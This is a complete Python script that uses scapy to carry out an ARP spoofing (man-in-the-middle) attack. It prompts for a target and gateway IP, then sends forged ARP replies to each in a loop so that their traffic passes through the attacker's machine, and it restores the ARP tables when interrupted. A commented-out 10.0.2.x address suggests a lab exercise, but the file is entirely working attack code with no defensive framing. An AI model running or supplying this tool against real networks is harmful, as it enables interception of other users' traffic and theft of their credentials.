#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

from pip._vendor.distlib.compat import raw_input


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


# target_ip = "10.0.2.10"
# gateway_ip = "10.0.2.1"

ip_address = {"target_ip": raw_input("Target ip > "), "gateway_ip": raw_input("Gateway ip > ")}
sent_packets_count = 0
try:
    while True:
        spoof(ip_address['target_ip'], ip_address['gateway_ip'])
        spoof(ip_address['gateway_ip'], ip_address['target_ip'])
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-} Detected CTRL + C ...... Resetting ARP tables.... Please wait.\n.")
    restore(ip_address['target_ip'], ip_address['gateway_ip'])
    restore(ip_address['gateway_ip'], ip_address['target_ip'])